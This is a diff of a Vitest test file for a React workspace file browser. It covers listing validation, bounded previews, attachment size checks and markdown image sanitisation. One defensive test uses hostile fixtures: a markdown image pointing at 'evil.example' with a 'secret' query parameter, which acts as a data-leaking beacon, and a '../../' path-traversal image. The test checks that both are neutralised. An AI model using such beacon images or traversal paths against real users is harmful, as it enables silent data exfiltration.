@@ -1,8 +1,16 @@
 import React from "react";
 import { renderToStaticMarkup } from "react-dom/server";
 import { describe, expect, it } from "vitest";
+import { Markdown } from "@abstractframework/panel-chat";
 import {
   FilePreview,
+  PREVIEW_TEXT_LIMIT,
+  attachOutcomeNotice,
+  attachPrecheck,
+  parseListing,
+  partialPreviewNote,
+  readBoundedText,
+  safeMarkdownImages,
   WorkspaceFileList,
   WorkspaceHeader,
   canOpenFolder,
@@ -75,7 +83,7 @@ describe("session workspace listing", () => {
       />,
     );
     expect(html.indexOf("src/")).toBeLessThan(html.indexOf("notes.md"));
-    expect(html).toContain("2.0 KB");
+    expect(html).toContain("2.0 KiB");
     expect(html).toContain("listed only part of this folder (2 entries shown)");
   });
 
@@ -138,16 +146,102 @@ describe("file preview", () => {
 
   it("keeps the attach-to-conversation action and says when a preview is partial", () => {
     const html = render(
-      { status: "ready", kind: "text", text: "x", partial: true },
+      { status: "ready", kind: "text", text: "x", partial: true, total: 3 * 1024 * 1024 },
       { ...entry, size_bytes: 3 * 1024 * 1024 },
     );
     expect(html).toContain("Attach to conversation");
-    expect(html).toContain(`Showing the first ${formatBytes(512 * 1024)} of 3.0 MB`);
+    expect(html).toContain("Showing the first 1 MiB of 3.0 MiB; download for the rest.");
   });
 
   it("surfaces a gateway error instead of an empty preview", () => {
     expect(render({ status: "error", message: "Preview failed (404): no route" })).toContain(
       "Preview failed (404): no route",
     );
+  });
+});
+
+describe("listing validation", () => {
+  it("keeps the gateway's truncated flag", () => {
+    const listing = parseListing({ path: "", entries: [{ name: "a", path: "a", type: "file" }], truncated: true }, "");
+    expect(listing.truncated).toBe(true);
+    const html = renderToStaticMarkup(<WorkspaceFileList listing={listing} onOpenDir={noop} onSelectFile={noop} />);
+    expect(html).toContain("listed only part of this folder (1 entries shown)");
+    expect(parseListing({ entries: [], truncated: false }, "sub").path).toBe("sub");
+  });
+
+  it("treats a malformed or older response as an error, not an empty folder", () => {
+    expect(() => parseListing({ items: [] }, "")).toThrow(/Unexpected \/workspace\/files response.*entries/);
+    expect(() => parseListing({ entries: [] }, "")).toThrow(/truncated/);
+    expect(() => parseListing({ entries: [{ name: "x" }], truncated: false }, "")).toThrow(/entry 1/);
+    expect(() => parseListing(null, "")).toThrow(/not an object/);
+  });
+});
+
+describe("bounded text preview", () => {
+  const body = (bytes: number) => new Uint8Array(bytes).fill(97);
+
+  it("reads only the first 1 MiB of a large file even when the server ignores Range", async () => {
+    const total = 3 * 1024 * 1024;
+    const response = new Response(body(total), { status: 200, headers: { "content-length": String(total) } });
+    const read = await readBoundedText(response, PREVIEW_TEXT_LIMIT);
+    expect(read.received).toBe(PREVIEW_TEXT_LIMIT);
+    expect(read.text.length).toBe(PREVIEW_TEXT_LIMIT);
+    expect(read).toMatchObject({ partial: true, total });
+    expect(partialPreviewNote(read.total)).toBe("Showing the first 1 MiB of 3.0 MiB; download for the rest.");
+  });
+
+  it("takes the size from Content-Range when the listing gives none", async () => {
+    const response = new Response(body(1024), { status: 206, headers: { "content-range": "bytes 0-1023/5000" } });
+    const read = await readBoundedText(response, 1024);
+    expect(read).toMatchObject({ received: 1024, total: 5000, partial: true });
+  });
+
+  it("is complete when the whole file fits", async () => {
+    const response = new Response("hello", { status: 206, headers: { "content-range": "bytes 0-4/5" } });
+    expect(await readBoundedText(response, PREVIEW_TEXT_LIMIT)).toMatchObject({ text: "hello", partial: false, total: 5 });
+  });
+
+  it("says the size is unknown rather than guessing", () => {
+    expect(partialPreviewNote(undefined)).toContain("a file of unknown size");
+  });
+});
+
+describe("attach from the workspace", () => {
+  const big = { name: "dump.bin", path: "dump.bin", type: "file" as const, size_bytes: 5 * 1024 * 1024 };
+
+  it("applies the gateway's size limit before downloading", () => {
+    expect(attachPrecheck(big, 1024 * 1024)).toBe("dump.bin is 5 MB; the gateway accepts files up to 1 MB.");
+    expect(attachPrecheck(big, undefined)).toBeNull();
+    expect(attachPrecheck({ ...big, size_bytes: 10 }, 1024)).toBeNull();
+  });
+
+  it("never claims success for a refused file and names the reason", () => {
+    const refused = { id: "1", name: "a", size: 9, status: "refused" as const, file: new File(["x"], "a"), message: "a is 9 B; the gateway accepts files up to 1 B." };
+    expect(attachOutcomeNotice("a", refused)).toBe("Not attached: a is 9 B; the gateway accepts files up to 1 B.");
+    expect(attachOutcomeNotice("a", { ...refused, status: "queued", message: undefined })).not.toContain("added");
+    expect(attachOutcomeNotice("a", undefined)).toContain("not queued");
+  });
+});
+
+describe("markdown preview images", () => {
+  it("renders workspace images and turns remote ones into links", () => {
+    const md = [
+      "![plot](figs/plot.png)",
+      "![beacon](https://evil.example/t.gif?d=secret)",
+      "Inline ![pix](//evil.example/p.png) text",
+      "![up](../../escape.png)",
+      "```",
+      "![code](https://example.com/in-code.png)",
+      "```",
+    ].join("\n");
+    const safe = safeMarkdownImages(md, "r1", "docs/README.md");
+    expect(safe).toContain("![plot](/api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png)");
+    expect(safe).toContain("[image: beacon](https://evil.example/t.gif?d=secret)");
+    expect(safe).toContain("[image: pix](//evil.example/p.png)");
+    expect(safe).toContain("[image: up](../../escape.png)");
+    expect(safe).toContain("![code](https://example.com/in-code.png)");
+    const html = renderToStaticMarkup(<Markdown text={safe.split("```")[0]} />);
+    expect(html).toContain('src="/api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png"');
+    expect(html).not.toMatch(/<img[^>]+src="(https?:)?\/\/evil/);
   });
 });
